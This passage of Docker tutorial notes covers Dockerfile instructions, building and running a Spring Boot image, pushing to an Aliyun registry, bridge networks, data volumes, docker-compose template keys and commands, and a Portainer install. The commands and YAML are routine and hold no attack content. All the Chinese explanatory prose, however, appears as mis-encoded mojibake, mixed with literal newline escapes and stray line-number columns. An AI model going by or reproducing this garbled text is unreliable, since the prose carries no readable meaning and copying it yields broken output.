relativeDir/  å¯ä»¥æå®ç¸å¯¹è·¯å¾\n   ADD test.txt /absoluteDir/ ä¹å¯ä»¥æå®ç»å¯¹è·¯å¾\n   ADD url \n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n# COPY\n\n * ç¨æ¥å°contextç®å½ä¸­æå®æä»¶å¤å¶å°éåçæå®ç®å½ä¸­\n\n * è¯­æ³:\n   \n   COPY src dest\n   COPY ["<src>",... "<dest>"]\n   \n   \n   1\n   2\n   \n\n# VOLUME\n\n * ç¨æ¥å®ä¹å®¹å¨è¿è¡æ¶å¯ä»¥æå¨å°å®¿ä¸»æºçç®å½\n\n * è¯­æ³:\n   \n   VOLUME ["/data"]\n   \n   \n   1\n   \n\n# ENTRYPOINT\n\n * ç¨æ¥æå®å®¹å¨å¯å¨æ¶æ§è¡å½ä»¤åCMDç±»ä¼¼\n\n * è¯­æ³:\n   \n     ["executable", "param1", "param2"]\n   ENTRYPOINT command param1 param2\n   \n   \n   1\n   2\n   \n   \n   ENTRYPOINTæä»¤ï¼å¾å¾ç¨äºè®¾ç½®å®¹å¨å¯å¨åçç¬¬ä¸ä¸ªå½ä»¤ï¼è¿å¯¹ä¸ä¸ªå®¹å¨æ¥è¯´å¾å¾æ¯åºå®çã CMDæä»¤ï¼å¾å¾ç¨äºè®¾ç½®å®¹å¨å¯å¨çç¬¬ä¸ä¸ªå½ä»¤çé»è®¤åæ°ï¼è¿å¯¹ä¸ä¸ªå®¹å¨æ¥è¯´å¯ä»¥æ¯ååçã\n\n# ONBUILD\n\nè§¦åå¨ï¼å½æå»ºä¸ä¸ªè¢«ç»§æ¿çDockerfileæ¶è¿è¡çå½ä»¤ï¼ç¶éåå¨è¢«å­éåéæä¹åï¼onbuildè¢«è§¦å\n\n\n\n\n# Dockerfile æå Springbooté¡¹ç®\n\n# 0. æåæ¬å°é¡¹ç®\n\n\n\n# 1. å°å¯è¿è¡é¡¹ç®æ¾å¥linuxèææºä¸­\n\n\n\n# 3. ç¼ådockerFile\n\nFROM openjdk:8\nWORKDIR /ems\nADD ems.jar /ems\nEXPOSE 8989\nENTRYPOINT ["java","-jar"]\nCMD ["ems.jar"]\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 4. æå»ºè¿è¡\n\n[root@localhost ems]# docker build -t ems .\n[root@localhost ems]# docker run -p 8989:8989 ems\n\n\n1\n2\n\n\n\n# æ¬å°éååå¸\n\n<https://cr.console.aliyun.com/cn-beijing/instance/repositories>\n\n\n1\n\n\n\n\n1. ç»å½é¿éäºDocker Registry $ sudo docker login --username=153****2135 registry.cn-beijing.aliyuncs.com\n\nç¨äºç»å½çç¨æ·åä¸ºé¿éäºè´¦å·å¨åï¼å¯ç ä¸ºå¼éæå¡æ¶è®¾ç½®çå¯ç ã æ¨å¯ä»¥å¨è®¿é®å­è¯é¡µé¢ä¿®æ¹å­è¯å¯ç ã\n\n\n# 2. ä»Registryä¸­æåéå\n\n$ sudo docker pull registry.cn-beijing.aliyuncs.com/csbugless/test:[éåçæ¬å·]\n\n\n1\n\n\n\n# 3. å°éåæ¨éå°Registry\n\n$ sudo docker login --username=153****2135 registry.cn-beijing.aliyuncs.com\n$ sudo docker tag [ImageId] registry.cn-beijing.aliyuncs.com/csbugless/test:[éåçæ¬å·]\n$ sudo docker push registry.cn-beijing.aliyuncs.com/csbugless/test:[éåçæ¬å·]\n\n\n1\n2\n3\n\n\nè¯·æ ¹æ®å®ééåä¿¡æ¯æ¿æ¢ç¤ºä¾ä¸­ç[ImageId]å[éåçæ¬å·]åæ°ã\n\n\n# 4. éæ©åéçéåä»åºå°å\n\nä»ECSæ¨ééåæ¶ï¼å¯ä»¥éæ©ä½¿ç¨éåä»åºåç½å°åãæ¨ééåº¦å°å¾å°æåå¹¶ä¸å°ä¸ä¼æèæ¨çå¬ç½æµéã\n\nå¦ææ¨ä½¿ç¨çæºå¨ä½äºVPCç½ç»ï¼è¯·ä½¿ç¨ registry-vpc.cn-beijing.aliyuncs.com ä½ä¸ºRegistryçååç»å½ã\n\n\n# 5. ç¤ºä¾\n\nä½¿ç¨"docker tag"å½ä»¤éå½åéåï¼å¹¶å°å®éè¿ä¸æç½ç»å°åæ¨éè³Registryã\n\n$ sudo docker imagesREPOSITORY                                                         TAG                 IMAGE ID            CREATED             VIRTUAL SIZEregistry.aliyuncs.com/acs/agent                                    0.7-dfb6816         37bb9c63c8b2        7 days ago          37.89 MB$ sudo docker tag 37bb9c63c8b2 registry-vpc.cn-beijing.aliyuncs.com/acs/agent:0.7-dfb6816\n\n\n1\n\n\nä½¿ç¨ "docker push" å½ä»¤å°è¯¥éåæ¨éè³è¿ç¨ã\n\n$ sudo docker push registry-vpc.cn-beijing.aliyuncs.com/acs/agent:0.7-dfb6816\n\n\n1\n\n\n\n# é«çº§ç½ç»åå®¹å¨å·\n\n\n# é«çº§ç½ç»éç½®\n\n# è¯´æ\n\nå½ Docker å¯å¨æ¶ï¼ä¼èªå¨å¨ä¸»æºä¸åå»ºä¸ä¸ª docker0 èæç½æ¡¥ï¼å®éä¸æ¯ Linux çä¸ä¸ª bridgeï¼å¯ä»¥çè§£ä¸ºä¸ä¸ªè½¯ä»¶äº¤æ¢æºãå®ä¼å¨æè½½å°å®çç½å£ä¹é´è¿è¡è½¬åã\n\nåæ¶ï¼Docker éæºåéä¸ä¸ªæ¬å°æªå ç¨çç§æç½æ®µï¼å¨ RFC1918 ä¸­å®ä¹ï¼ä¸­çä¸ä¸ªå°åç» docker0 æ¥å£ãæ¯å¦å¸åç 172.17.42.1ï¼æ©ç ä¸º 255.255.0.0ãæ­¤åå¯å¨çå®¹å¨åçç½å£ä¹ä¼èªå¨åéä¸ä¸ªåä¸ç½æ®µï¼172.17.0.0/16ï¼çå°åã\n\nå½åå»ºä¸ä¸ª Docker å®¹å¨çæ¶åï¼åæ¶ä¼åå»ºäºä¸å¯¹ veth pair æ¥å£ï¼å½æ°æ®ååéå°ä¸ä¸ªæ¥å£æ¶ï¼å¦å¤ä¸ä¸ªæ¥å£ä¹å¯ä»¥æ¶å°ç¸åçæ°æ®åï¼ãè¿å¯¹æ¥å£ä¸ç«¯å¨å®¹å¨åï¼å³ eth0ï¼å¦ä¸ç«¯å¨æ¬å°å¹¶è¢«æè½½å° docker0 ç½æ¡¥ï¼åç§°ä»¥ veth å¼å¤´ï¼ä¾å¦ vethAQI2QTï¼ãéè¿è¿ç§æ¹å¼ï¼ä¸»æºå¯ä»¥è·å®¹å¨éä¿¡ï¼å®¹å¨ä¹é´ä¹å¯ä»¥ç¸äºéä¿¡ãDocker å°±åå»ºäºå¨ä¸»æºåææå®¹å¨ä¹é´ä¸ä¸ªèæå±äº«ç½ç»ã\n\n\n\n# æ¥çç½ç»ä¿¡æ¯\n\n# docker network ls\n\n\n1\n\n\n# åå»ºä¸ä¸ªç½æ¡¥\n\n# docker network create -d bridge ç½æ¡¥åç§°\n\n\n1\n\n\n# å é¤ä¸ä¸ªç½æ¡¥\n\n# docker network rm ç½æ¡¥åç§°\n\n\n1\n\n\n# å®¹å¨ä¹åä½¿ç¨ç½ç»éä¿¡\n\n# 1.æ¥è¯¢å½åç½ç»éç½®\n- docker network ls\nNETWORK ID          NAME                DRIVER              SCOPE\n8e424e5936b7        bridge              bridge              local\n17d974db02da        docker_gwbridge     bridge              local\nd6c326e433f7        host                host                local\n# 2.åå»ºæ¡¥æ¥ç½ç»\n- docker network create -d bridge info\n[root@centos ~]# docker network create -d bridge info\n6e4aaebff79b1df43a064e0e8fdab08f52d64ce34db78dd5184ce7aaaf550a2f\n[root@centos ~]# docker network ls\nNETWORK ID          NAME                DRIVER              SCOPE\n8e424e5936b7        bridge              bridge              local\n17d974db02da        docker_gwbridge     bridge              local\nd6c326e433f7        host                host                local\n6e4aaebff79b        info                bridge              local\n# 3.å¯å¨å®¹å¨æå®ä½¿ç¨ç½æ¡¥\n- docker run -d -p 8890:80 --name nginx001 --network info nginx \n- docker run -d -p 8891:80 --name nginx002 --network info nginx \næ³¨æ:ä¸æ¦æå®ç½æ¡¥å--nameæå®åå­å°±æ¯ä¸»æºå,å¤ä¸ªå®¹å¨æå®å¨åä¸ä¸ªç½æ¡¥æ¶,å¯ä»¥å¨ä»»æä¸ä¸ªå®¹å¨ä¸­ä½¿ç¨ä¸»æºåä¸å®¹å¨è¿è¡äºé\n[root@centos ~]# docker run -d -p 8890:80 --name nginx001 --network info nginx \nc315bcc94e9ddaa36eb6c6f16ca51592b1ac8bf1ecfe9d8f01d892f3f10825fe\n[root@centos ~]# docker run -d -p 8891:80 --name nginx002 --network info nginx\nf8682db35dd7fb4395f90edb38df7cad71bbfaba71b6a4c6e2a3a525cb73c2a5\n[root@centos ~]# docker ps\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES\nf8682db35dd7        nginx               "/docker-entrypoint.â¦"   3 seconds ago       Up 2 seconds        0.0.0.0:8891->80/tcp   nginx002\nc315bcc94e9d        nginx               "/docker-entrypoint.â¦"   7 minutes ago       Up 7 minutes        0.0.0.0:8890->80/tcp   nginx001\nb63169d43792        mysql:5.7.19        "docker-entrypoint.sâ¦"   7 minutes ago       Up 7 minutes        3306/tcp               mysql_mysql.1.s75qe5kkpwwttyf0wrjvd2cda\n[root@centos ~]# docker exec -it f8682db35dd7 /bin/bash\nroot@f8682db35dd7:/# curl http://nginx001\n<!DOCTYPE html>\n<html>\n<head>\n<title>Welcome to nginx!</title>\n.....\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# é«çº§æ°æ®å·éç½®\n\n# è¯´æ\n\næ°æ®å· æ¯ä¸ä¸ªå¯ä¾ä¸ä¸ªæå¤ä¸ªå®¹å¨ä½¿ç¨çç¹æ®ç®å½ï¼å®ç»è¿ UFSï¼å¯ä»¥æä¾å¾å¤æç¨çç¹æ§ï¼\n\n * æ°æ®å· å¯ä»¥å¨å®¹å¨ä¹é´å±äº«åéç¨\n * å¯¹ æ°æ®å· çä¿®æ¹ä¼ç«é©¬çæ\n * å¯¹ æ°æ®å· çæ´æ°ï¼ä¸ä¼å½±åéå\n * æ°æ®å· é»è®¤ä¼ä¸ç´å­å¨ï¼å³ä½¿å®¹å¨è¢«å é¤\n\n> æ³¨æï¼æ°æ®å· çä½¿ç¨ï¼ç±»ä¼¼äº Linux ä¸å¯¹ç®å½ææä»¶è¿è¡ mountï¼éåä¸­çè¢«æå®ä¸ºæè½½ç¹çç®å½ä¸­çæä»¶ä¼å¤å¶å°æ°æ®å·ä¸­ï¼ä»æ°æ®å·ä¸ºç©ºæ¶ä¼å¤å¶ï¼ã\n\n# åå»ºæ°æ®å·\n\n[root@centos ~]# docker volume create my-vol\nmy-vol\n\n\n1\n2\n\n\n# æ¥çæ°æ®å·\n\n[root@centos ~]# docker volume inspect my-vol       \n[\n    {\n        "CreatedAt": "2020-11-25T11:43:56+08:00",\n        "Driver": "local",\n        "Labels": {},\n        "Mountpoint": "/var/lib/docker/volumes/my-vol/_data",\n        "Name": "my-vol",\n        "Options": {},\n        "Scope": "local"\n    }\n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# æè½½æ°æ®å·\n\n[root@centos ~]# docker run -d -P --name web  -v my-vol:/usr/share/nginx/html  nginx\n[root@centos ~]# docker inspect web\n\t\t\t\t"Mounts": [\n            {\n                "Type": "volume",\n                "Name": "my-vol",\n                "Source": "/var/lib/docker/volumes/my-vol/_data",\n                "Destination": "/usr/share/nginx/html",\n                "Driver": "local",\n                "Mode": "z",\n                "RW": true,\n                "Propagation": ""\n            }\n        ],\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# å é¤æ°æ®å·\n\ndocker volume rm my-vol\n\n\n1\n\n\n\n# Docker compose\n\n\n# docker composeä½¿ç¨\n\n# 1.ç¸å³æ¦å¿µ\n\né¦åä»ç»å ä¸ªæ¯è¯­ã\n\n * æå¡ (service)ï¼ä¸ä¸ªåºç¨å®¹å¨ï¼å®éä¸å¯ä»¥è¿è¡å¤ä¸ªç¸åéåçå®ä¾ã\n * é¡¹ç® (project)ï¼ç±ä¸ç»å³èçåºç¨å®¹å¨ç»æçä¸ä¸ªå®æ´ä¸å¡ååãâä¸ä¸ªé¡¹ç®å¯ä»¥ç±å¤ä¸ªæå¡ï¼å®¹å¨ï¼å³èèæï¼Compose é¢åé¡¹ç®è¿è¡ç®¡çã\n\n# 2.åºæ¯\n\næå¸¸è§çé¡¹ç®æ¯ web ç½ç«ï¼è¯¥é¡¹ç®åºè¯¥åå« web åºç¨åç¼å­ã\n\n * springbootåºç¨\n * mysqlæå¡\n * redisæå¡\n * elasticsearchæå¡\n * .......\n\n# 3.docker-composeæ¨¡æ¿\n\n * åèææ¡£:https://docker_practice.gitee.io/zh-cn/compose/compose_file.html\n\nversion: "3.0"\nservices:\n  mysqldb:\n    image: mysql:5.7.19\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - /root/mysql/conf:/etc/mysql/conf.d\n      - /root/mysql/logs:/logs\n      - /root/mysql/data:/var/lib/mysql\n    environment:\n      MYSQL_ROOT_PASSWORD: root\n    networks:\n      - ems\n    depends_on:\n      - redis\n\n  redis:\n    image: redis:4.0.14\n    container_name: redis\n    ports:\n      - "6379:6379"\n    networks:\n      - ems\n    volumes:\n      - /root/redis/data:/data\n    command: redis-server\n    \nnetworks:\n  ems:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 4.éè¿docker-composeè¿è¡ä¸ç»å®¹å¨\n\n * åèææ¡£:https://docker_practice.gitee.io/zh-cn/compose/commands.html\n\n[root@centos ~]# docker-compose up    \t\t\t\t\t\t\t//åå°å¯å¨ä¸ç»æå¡\n[root@centos ~]# docker-compose up -d \t\t\t\t\t\t\t//åå°å¯å¨ä¸ç»æå¡\n\n\n1\n2\n\n\n----------------------------------------\n\n\n# docker-compose æ¨¡æ¿æä»¶\n\næ¨¡æ¿æä»¶æ¯ä½¿ç¨ Compose çæ ¸å¿ï¼æ¶åå°çæä»¤å³é®å­ä¹æ¯è¾å¤ãä½å¤§å®¶ä¸ç¨æå¿ï¼è¿éé¢å¤§é¨åæä»¤è· docker run ç¸å³åæ°çå«ä¹é½æ¯ç±»ä¼¼çã\n\né»è®¤çæ¨¡æ¿æä»¶åç§°ä¸º docker-compose.ymlï¼æ ¼å¼ä¸º YAML æ ¼å¼ã\n\nversion: "3"\n\nservices:\n  webapp:\n    image: examples/web\n    ports:\n      - "80:80"\n    volumes:\n      - "/data"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ³¨ææ¯ä¸ªæå¡é½å¿é¡»éè¿ image æä»¤æå®éåæ build æä»¤ï¼éè¦ Dockerfileï¼ç­æ¥èªå¨æå»ºçæéåã\n\nå¦æä½¿ç¨ build æä»¤ï¼å¨ Dockerfile ä¸­è®¾ç½®çéé¡¹(ä¾å¦ï¼CMD, EXPOSE, VOLUME, ENV ç­) å°ä¼èªå¨è¢«è·åï¼æ éå¨ docker-compose.yml ä¸­éå¤è®¾ç½®ã\n\nä¸é¢åå«ä»ç»åä¸ªæä»¤çç¨æ³ã\n\n# build\n\næå® Dockerfile æå¨æä»¶å¤¹çè·¯å¾ï¼å¯ä»¥æ¯ç»å¯¹è·¯å¾ï¼æèç¸å¯¹ docker-compose.yml æä»¶çè·¯å¾ï¼ã Compose å°ä¼å©ç¨å®èªå¨æå»ºè¿ä¸ªéåï¼ç¶åä½¿ç¨è¿ä¸ªéåã\n\nversion: \'3\'\nservices:\n\n  webapp:\n    build: ./dir\n\n\n1\n2\n3\n4\n5\n\n\nä½ ä¹å¯ä»¥ä½¿ç¨ context æä»¤æå® Dockerfile æå¨æä»¶å¤¹çè·¯å¾ã\n\nä½¿ç¨ dockerfile æä»¤æå® Dockerfile æä»¶åã\n\nä½¿ç¨ arg æä»¤æå®æå»ºéåæ¶çåéã\n\nversion: \'3\'\nservices:\n\n  webapp:\n    build:\n      context: ./dir\n      dockerfile: Dockerfile-alternate\n      args:\n        buildno: 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# command\n\nè¦çå®¹å¨å¯å¨åé»è®¤æ§è¡çå½ä»¤ã\n\ncommand: echo "hello world"\n\n\n1\n\n\n# container_name\n\næå®å®¹å¨åç§°ãé»è®¤å°ä¼ä½¿ç¨ é¡¹ç®åç§°_æå¡åç§°_åºå· è¿æ ·çæ ¼å¼ã\n\ncontainer_name: docker-web-container\n\n\n1\n\n\n> æ³¨æ: æå®å®¹å¨åç§°åï¼è¯¥æå¡å°æ æ³è¿è¡æ©å±ï¼scaleï¼ï¼å ä¸º Docker ä¸åè®¸å¤ä¸ªå®¹å¨å·æç¸åçåç§°ã\n\n# depends_on\n\nè§£å³å®¹å¨çä¾èµãå¯å¨ååçé®é¢ãä»¥ä¸ä¾å­ä¸­ä¼åå¯å¨ redis db åå¯å¨ web\n\nversion: \'3\'\n\nservices:\n  web:\n    build: .\n    depends_on:\n      - db\n      - redis\n\n  redis:\n    image: redis\n\n  db:\n    image: postgres\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n> æ³¨æï¼web æå¡ä¸ä¼ç­å¾ redis db ãå®å¨å¯å¨ãä¹åæå¯å¨ã\n\n# env_file\n\nä»æä»¶ä¸­è·åç¯å¢åéï¼å¯ä»¥ä¸ºåç¬çæä»¶è·¯å¾æåè¡¨ã\n\nå¦æéè¿ docker-compose -f FILE æ¹å¼æ¥æå® Compose æ¨¡æ¿æä»¶ï¼å env_file ä¸­åéçè·¯å¾ä¼åºäºæ¨¡æ¿æä»¶è·¯å¾ã\n\nå¦ææåéåç§°ä¸ environment æä»¤å²çªï¼åæç§æ¯ä¾ï¼ä»¥åèä¸ºåã\n\nenv_file: .env\n\nenv_file:\n  - ./common.env\n  - ./apps/web.env\n  - /opt/secrets.env\n\n\n1\n2\n3\n4\n5\n6\n\n\nç¯å¢åéæä»¶ä¸­æ¯ä¸è¡å¿é¡»ç¬¦åæ ¼å¼ï¼æ¯æ # å¼å¤´çæ³¨éè¡ã\n\n# common.env: Set development environment\nPROG_ENV=development\n\n\n1\n2\n\n\n# environment\n\nè®¾ç½®ç¯å¢åéãä½ å¯ä»¥ä½¿ç¨æ°ç»æå­å¸ä¸¤ç§æ ¼å¼ã\n\nåªç»å®åç§°çåéä¼èªå¨è·åè¿è¡ Compose ä¸»æºä¸å¯¹åºåéçå¼ï¼å¯ä»¥ç¨æ¥é²æ­¢æ³é²ä¸å¿è¦çæ°æ®ã\n\nenvironment:\n  RACK_ENV: development\n  SESSION_SECRET:\n\nenvironment:\n  - RACK_ENV=development\n  - SESSION_SECRET\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nå¦æåéåç§°æèå¼ä¸­ç¨å° true|falseï¼yes|no ç­è¡¨è¾¾ å¸å° å«ä¹çè¯æ±ï¼æå¥½æ¾å°å¼å·éï¼é¿å YAML èªå¨è§£ææäºåå®¹ä¸ºå¯¹åºçå¸å°è¯­ä¹ãè¿äºç¹å®è¯æ±ï¼åæ¬\n\ny|Y|yes|Yes|YES|n|N|no|No|NO|true|True|TRUE|false|False|FALSE|on|On|ON|off|Off|OFF\n\n\n1\n\n\n# healthcheck\n\néè¿å½ä»¤æ£æ¥å®¹å¨æ¯å¦å¥åº·è¿è¡ã\n\nhealthcheck:\n  test: ["CMD", "curl", "-f", "http://localhost"]\n  interval: 1m30s\n  timeout: 10s\n  retries: 3\n\n\n1\n2\n3\n4\n5\n\n\n# image\n\næå®ä¸ºéååç§°æéå IDãå¦æéåå¨æ¬å°ä¸å­å¨ï¼Compose å°ä¼å°è¯æåè¿ä¸ªéåã\n\nimage: ubuntu\nimage: orchardup/postgresql\nimage: a4bc65fd\n\n\n1\n2\n3\n\n\n# networks\n\néç½®å®¹å¨è¿æ¥çç½ç»ã\n\nversion: "3"\nservices:\n\n  some-service:\n    networks:\n     - some-network\n     - other-network\n\nnetworks:\n  some-network:\n  other-network:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# ports\n\næ´é²ç«¯å£ä¿¡æ¯ã\n\nä½¿ç¨å®¿ä¸»ç«¯å£ï¼å®¹å¨ç«¯å£ (HOST:CONTAINER) æ ¼å¼ï¼æèä»ä»æå®å®¹å¨çç«¯å£ï¼å®¿ä¸»å°ä¼éæºéæ©ç«¯å£ï¼é½å¯ä»¥ã\n\nports:\n - "3000"\n - "8000:8000"\n - "49100:22"\n - "127.0.0.1:8001:8001"\n\n\n1\n2\n3\n4\n5\n\n\næ³¨æï¼å½ä½¿ç¨ HOST:CONTAINER æ ¼å¼æ¥æ å°ç«¯å£æ¶ï¼å¦æä½ ä½¿ç¨çå®¹å¨ç«¯å£å°äº 60 å¹¶ä¸æ²¡æ¾å°å¼å·éï¼å¯è½ä¼å¾å°éè¯¯ç»æï¼å ä¸º YAML ä¼èªå¨è§£æ xx:yy è¿ç§æ°å­æ ¼å¼ä¸º 60 è¿å¶ãä¸ºé¿ååºç°è¿ç§é®é¢ï¼å»ºè®®æ°å­ä¸²é½éç¨å¼å·åæ¬èµ·æ¥çå­ç¬¦ä¸²æ ¼å¼ã\n\n# sysctls\n\néç½®å®¹å¨åæ ¸åæ°ã\n\nsysctls:\n  net.core.somaxconn: 1024\n  net.ipv4.tcp_syncookies: 0\n\nsysctls:\n  - net.core.somaxconn=1024\n  - net.ipv4.tcp_syncookies=0\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# ulimits\n\næå®å®¹å¨ç ulimits éå¶å¼ã\n\nä¾å¦ï¼æå®æå¤§è¿ç¨æ°ä¸º 65535ï¼æå®æä»¶å¥ææ°ä¸º 20000ï¼è½¯éå¶ï¼åºç¨å¯ä»¥éæ¶ä¿®æ¹ï¼ä¸è½è¶è¿ç¡¬éå¶ï¼ å 40000ï¼ç³»ç»ç¡¬éå¶ï¼åªè½ root ç¨æ·æé«ï¼ã\n\n  ulimits:\n    nproc: 65535\n    nofile:\n      soft: 20000\n      hard: 40000\n\n\n1\n2\n3\n4\n5\n\n\n# volumes\n\næ°æ®å·ææè½½è·¯å¾è®¾ç½®ãå¯ä»¥è®¾ç½®ä¸ºå®¿ä¸»æºè·¯å¾(HOST:CONTAINER)æèæ°æ®å·åç§°(VOLUME:CONTAINER)ï¼å¹¶ä¸å¯ä»¥è®¾ç½®è®¿é®æ¨¡å¼ ï¼HOST:CONTAINER:roï¼ã\n\nè¯¥æä»¤ä¸­è·¯å¾æ¯æç¸å¯¹è·¯å¾ã\n\nvolumes:\n - /var/lib/mysql\n - cache/:/tmp/cache\n - ~/configs:/etc/configs/:ro\n\n\n1\n2\n3\n4\n\n\nå¦æè·¯å¾ä¸ºæ°æ®å·åç§°ï¼å¿é¡»å¨æä»¶ä¸­éç½®æ°æ®å·ã\n\nversion: "3"\n\nservices:\n  my_src:\n    image: mysql:8.0\n    volumes:\n      - mysql_data:/var/lib/mysql\n\nvolumes:\n  mysql_data:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n----------------------------------------\n\n\n# docker-compose å¸¸ç¨å½ä»¤\n\n# 1. å½ä»¤å¯¹è±¡ä¸æ ¼å¼\n\nå¯¹äº Compose æ¥è¯´ï¼å¤§é¨åå½ä»¤çå¯¹è±¡æ¢å¯ä»¥æ¯é¡¹ç®æ¬èº«ï¼ä¹å¯ä»¥æå®ä¸ºé¡¹ç®ä¸­çæå¡æèå®¹å¨ãå¦ææ²¡æç¹å«çè¯´æï¼å½ä»¤å¯¹è±¡å°æ¯é¡¹ç®ï¼è¿æå³çé¡¹ç®ä¸­ææçæå¡é½ä¼åå°å½ä»¤å½±åã\n\næ§è¡ docker-compose [COMMAND] --help æè docker-compose help [COMMAND] å¯ä»¥æ¥çå·ä½æä¸ªå½ä»¤çä½¿ç¨æ ¼å¼ã\n\ndocker-compose å½ä»¤çåºæ¬çä½¿ç¨æ ¼å¼æ¯\n\ndocker-compose [-f=<arg>...] [options] [COMMAND] [ARGS...]\n\n\n1\n\n\n# 2. å½ä»¤éé¡¹\n\n * -f, --file FILE æå®ä½¿ç¨ç Compose æ¨¡æ¿æä»¶ï¼é»è®¤ä¸º docker-compose.ymlï¼å¯ä»¥å¤æ¬¡æå®ã\n * -p, --project-name NAME æå®é¡¹ç®åç§°ï¼é»è®¤å°ä½¿ç¨æå¨ç®å½åç§°ä½ä¸ºé¡¹ç®åã\n * --x-networking ä½¿ç¨ Docker çå¯ææç½ç»åç«¯ç¹æ§\n * --x-network-driver DRIVER æå®ç½ç»åç«¯çé©±å¨ï¼é»è®¤ä¸º bridge\n * --verbose è¾åºæ´å¤è°è¯ä¿¡æ¯ã\n * -v, --version æå°çæ¬å¹¶éåºã\n\n# 3.å½ä»¤ä½¿ç¨è¯´æ\n\n# up\n\næ ¼å¼ä¸º docker-compose up [options] [SERVICE...]ã\n\n * è¯¥å½ä»¤ååå¼ºå¤§ï¼å®å°å°è¯èªå¨å®æåæ¬æå»ºéåï¼ï¼éæ°ï¼åå»ºæå¡ï¼å¯å¨æå¡ï¼å¹¶å³èæå¡ç¸å³å®¹å¨çä¸ç³»åæä½ã\n\n * é¾æ¥çæå¡é½å°ä¼è¢«èªå¨å¯å¨ï¼é¤éå·²ç»å¤äºè¿è¡ç¶æã\n\n * å¯ä»¥è¯´ï¼å¤§é¨åæ¶åé½å¯ä»¥ç´æ¥éè¿è¯¥å½ä»¤æ¥å¯å¨ä¸ä¸ªé¡¹ç®ã\n\n * é»è®¤æåµï¼docker-compose up å¯å¨çå®¹å¨é½å¨åå°ï¼æ§å¶å°å°ä¼åæ¶æå°ææå®¹å¨çè¾åºä¿¡æ¯ï¼å¯ä»¥å¾æ¹ä¾¿è¿è¡è°è¯ã\n\n * å½éè¿ Ctrl-C åæ­¢å½ä»¤æ¶ï¼ææå®¹å¨å°ä¼åæ­¢ã\n\n * å¦æä½¿ç¨ docker-compose up -dï¼å°ä¼å¨åå°å¯å¨å¹¶è¿è¡ææçå®¹å¨ãä¸è¬æ¨èçäº§ç¯å¢ä¸ä½¿ç¨è¯¥éé¡¹ã\n\n * é»è®¤æåµï¼å¦ææå¡å®¹å¨å·²ç»å­å¨ï¼docker-compose up å°ä¼å°è¯åæ­¢å®¹å¨ï¼ç¶åéæ°åå»ºï¼ä¿æä½¿ç¨ volumes-from æè½½çå·ï¼ï¼ä»¥ä¿è¯æ°å¯å¨çæå¡å¹é docker-compose.yml æä»¶çææ°åå®¹\n\n----------------------------------------\n\n# down\n\n * æ­¤å½ä»¤å°ä¼åæ­¢ up å½ä»¤æå¯å¨çå®¹å¨ï¼å¹¶ç§»é¤ç½ç»\n\n----------------------------------------\n\n# exec\n\n * è¿å¥æå®çå®¹å¨ã\n\n----------------------------------------\n\n# ps\n\næ ¼å¼ä¸º docker-compose ps [options] [SERVICE...]ã\n\nååºé¡¹ç®ä¸­ç®åçææå®¹å¨ã\n\néé¡¹ï¼\n\n * -q åªæå°å®¹å¨ç ID ä¿¡æ¯ã\n\n----------------------------------------\n\n# restart\n\næ ¼å¼ä¸º docker-compose restart [options] [SERVICE...]ã\n\néå¯é¡¹ç®ä¸­çæå¡ã\n\néé¡¹ï¼\n\n * -t, --timeout TIMEOUT æå®éå¯ååæ­¢å®¹å¨çè¶æ¶ï¼é»è®¤ä¸º 10 ç§ï¼ã\n\n----------------------------------------\n\n# rm\n\næ ¼å¼ä¸º docker-compose rm [options] [SERVICE...]ã\n\nå é¤ææï¼åæ­¢ç¶æçï¼æå¡å®¹å¨ãæ¨èåæ§è¡ docker-compose stop å½ä»¤æ¥åæ­¢å®¹å¨ã\n\néé¡¹ï¼\n\n * -f, --force å¼ºå¶ç´æ¥å é¤ï¼åæ¬éåæ­¢ç¶æçå®¹å¨ãä¸è¬å°½éä¸è¦ä½¿ç¨è¯¥éé¡¹ã\n * -v å é¤å®¹å¨ææè½½çæ°æ®å·ã\n\n----------------------------------------\n\n# start\n\næ ¼å¼ä¸º docker-compose start [SERVICE...]ã\n\nå¯å¨å·²ç»å­å¨çæå¡å®¹å¨ã\n\n----------------------------------------\n\n# stop\n\næ ¼å¼ä¸º docker-compose stop [options] [SERVICE...]ã\n\nåæ­¢å·²ç»å¤äºè¿è¡ç¶æçå®¹å¨ï¼ä½ä¸å é¤å®ãéè¿ docker-compose start å¯ä»¥åæ¬¡å¯å¨è¿äºå®¹å¨ã\n\néé¡¹ï¼\n\n * -t, --timeout TIMEOUT åæ­¢å®¹å¨æ¶åçè¶æ¶ï¼é»è®¤ä¸º 10 ç§ï¼ã\n\n----------------------------------------\n\n# top\n\næ¥çåä¸ªæå¡å®¹å¨åè¿è¡çè¿ç¨ã\n\n----------------------------------------\n\n# unpause\n\næ ¼å¼ä¸º docker-compose unpause [SERVICE...]ã\n\næ¢å¤å¤äºæåç¶æä¸­çæå¡ã\n\n----------------------------------------\n\n\n# dockerå¯è§åå·¥å·\n\n# å®è£Portainer\n\nå®æ¹å®è£è¯´æï¼https://www.portainer.io/installation/\n\n[root@ubuntu1804 ~]#docker pull  portainer/portainer\n\n[root@ubuntu1804 ~]#docker volume create portainer_data\nportainer_data\n[root@ubuntu1804 ~]#docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data 